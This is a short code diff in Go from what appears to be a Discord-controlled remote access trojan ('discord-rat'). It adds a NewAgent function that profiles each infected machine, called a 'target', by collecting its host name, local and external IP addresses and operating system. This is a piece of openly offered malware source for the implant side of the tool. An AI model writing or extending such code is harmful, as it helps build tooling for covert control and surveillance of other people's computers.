@@ -19,6 +19,12 @@
  */
 package agent
 
+import (
+	"os"
+
+	"github.com/codeuk/discord-rat/pkg/agent/system"
+)
+
 // Agent represents a single target.
 type Agent struct {
 	HostName   string
@@ -27,4 +33,15 @@ type Agent struct {
 	ExternalIP string
 	Status     string
 	Timestamp  string
+}
+
+// NewAgent configures and returns a new Agent containing the current systems information.
+func NewAgent() *Agent {
+	agent := &Agent{}
+	agent.HostName, _ = os.Hostname()
+	agent.LocalIP = system.GetLocalIP()
+	agent.ExternalIP = system.GetExternalIP()
+	agent.OS = system.GetFormattedPlatform()
+
+	return agent
 }
